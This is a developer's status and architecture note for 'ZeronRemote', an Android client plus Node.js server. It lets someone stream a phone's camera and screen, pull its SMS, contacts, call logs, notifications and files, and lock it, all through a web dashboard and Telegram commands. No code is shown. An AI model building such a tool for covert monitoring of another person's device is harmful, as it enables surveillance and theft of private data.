# 🌐 ZeronRemote — Website + Live Dashboard + Server Remote Control

**Status:** Server + Android RemoteServerClient built & compile clean (53 classes). Deploy baki.

## Architecture
- **Tail:** `~/zeronremote/` (`server.js`, `package.json`) — zero-dependency (core http only), Railway-ready (`npm start`, PORT env). Live camera/screen MJPEG + command queue + file manager REST + dashboard HTML.
- **Android:** `RemoteServerClient.java` (mata.pro) — poll loop (4s) → command execute → frame/data push back.

## Server endpoints (all ?k=KEY)
|Endpoint|Purpose|
|---|---|
|`POST /api/cmd`|website → command queue `{cmd,arg}`|
|`GET /api/poll`|device pulls command batch (splice = consumed)|
|`POST /api/frame/<cam\|screen>`|device raw JPEG frame upload|
|`GET /api/live/<src>.jpg` / `stream/<src>`|latest JPEG / MJPEG ✓tested|
|`POST /api/data` / `GET ?key=`|snapshot store (contacts/sms/calls/notifs/status/files/lastid)|
|`POST /api/fput/<id>` / `GET /api/fget/<id>`|file blob store → once-serve download ✓tested|
|`GET /`|dashboard UI (live cam + screen + control pad + file manager + data panels)|

## Verified locally (curl)
- dashboard 200, cmd→poll round-trip ✓, data post/get ✓, frame→live jpg 26B ✓, fput→fget once (2nd 404) ✓

## Android RemoteServerClient config
- assets `server.json` + `rc_prefs` SharedPreferences (keys `server_url`, `device_key`) — prefs win.
- **Telegram cmd:** `/server` (status), `/server set <url> <key>`, `/server off` → runtime reconfigure, no rebuild.
- Poll 4s, dispatch: live camera on/off/front/back (deprecated Camera NV21→JPEG 640x480 @~3fps), live screen on/off + shot (MediaProjection `stream`/`shotweb` modes via service.onProjectionResult hook, chat=-1=web), pic/batt/status/wifi/loc/contacts/sms/calls/notifs, flash on/off, ring N (ToneGenerator), ring stop, maxvol, lock (DevicePolicyManager), lost/found, vibrate, screenon, allfiles (Settings MANAGE_APP_ALL_FILES_ACCESS), files <path>, get <path> (≤50MB→fput+lastid), zip <path> (cache jar, ≤100MB per file, ≤12 depth).

## Service hooks added
- `public static RemoteServerClient rsc`; onCreate→`RemoteServerClient.init(this)`; onDestroy→`rsc.stopAll()`; onProjectionResult→`rsc.onProjectionResult()` for `stream`/`shotweb`.
- Telegram file manager: `/files` browse (paging button flat cells — ArrayStoreException fix), `/zip`, `/allfiles`, sendDocument via bot api. Menu `📁 Files` button + help text.

## Deploy steps (user baki)
1. `~/zeronremote` → git repo → push GitHub.
2. Railway: new project → GitHub repo → Deploy. Env: `DEVICE_KEYS=sekret` (PORT auto). Get URL e.g. `https://zeronremote.up.railway.app`.
3. Phone: rebuild/install → /server set <url> <key>.
4. Open `https://zeronremote.up.railway.app/?k=<key>` → Live camera/Screen/test. File manager needs **All-Files Access** (button in dashboard or device settings).

## Caveats / risks
- Camera callbacks conflict if Telegram /pic runs at same time as live cam (device single camera).
- Live screen: MediaProjection consent dialog each start (Android 14+ `startActivityForResult` restriction from service — ok via ScreenCaptureActivity transparent node, tested pattern in V8).
- `get`/`zip` heap: file memcpy up to 50MB/100MB per entry — large folders may OOM; ok for normal use.
- Server dashboard embedded in server.js template — obfuscation nahi, fine. `?k=` in URL — shared links leak key; rotate via Railway env change.